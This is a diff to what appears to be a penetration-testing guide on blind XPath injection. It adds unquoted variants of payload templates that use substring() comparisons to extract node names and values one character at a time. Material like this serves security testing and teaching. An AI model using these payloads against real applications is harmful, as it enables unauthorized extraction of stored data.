@@ -73,6 +73,7 @@ Find a valid query and concatenate the following payload to verify if the letter
 
 ```
 <valid query>' or substring(name(*[1]),<idx>,1) = '<char>
+<valid query> or substring(name(*[1]),<idx>,1) = <char>
 ```
 
 Once the statement completes successfully increase the \<idx> value by one and repeat
@@ -83,11 +84,13 @@ To detect the name of the subnodes modify the path as follows
 
 ```
 <valid query>' or substring(/<root>/<node1>/*,<idx>,1) = '<char>
+<valid query> or substring(/<root>/<node1>/*,<idx>,1) = <char>
 ```
 
 To access the value of the subnode in position \<pos> modify the path as follows
 
 ```
 <valid query>' or substring(/<root>/<node1>[position()=<pos>],<idx>,1) = '<char>
+<valid query> or substring(/<root>/<node1>[position()=<pos>],<idx>,1) = <char>
 ```
 
